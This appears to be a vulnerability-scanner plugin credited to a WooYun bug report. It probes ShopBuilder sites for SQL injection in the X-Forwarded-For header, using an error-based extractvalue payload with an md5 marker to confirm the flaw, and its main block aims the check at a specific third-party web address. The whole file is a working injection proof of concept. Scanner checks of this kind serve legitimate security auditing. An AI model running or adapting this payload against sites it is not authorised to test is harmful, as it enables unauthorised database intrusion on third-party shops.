#!/usr/bin/env python
# -*- coding: utf-8 -*-
#from:http://www.wooyun.org/bugs/wooyun-2014-067088

def assign(service,arg):
    if service == "shopbuilder":
        return True, arg

def audit(arg):
    payload = "X-Forwarded-For:127.0.0.1' and extractvalue(1,concat(0x3a,md5(3.14),0x3a)) and '1"
    url = arg + 'index.php'
    code, head, res, errcode,finalurl =  curl.curl('"-H %s %s"' % (payload,url))
    
    if code == 200 and '4beed3b9c4a886067de0e3a094246f7' in res:
        security_hole('find X-Forwarded-For sql inject:'+url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('shopbuilder', 'http://www.zgzyjczs.com/')[1])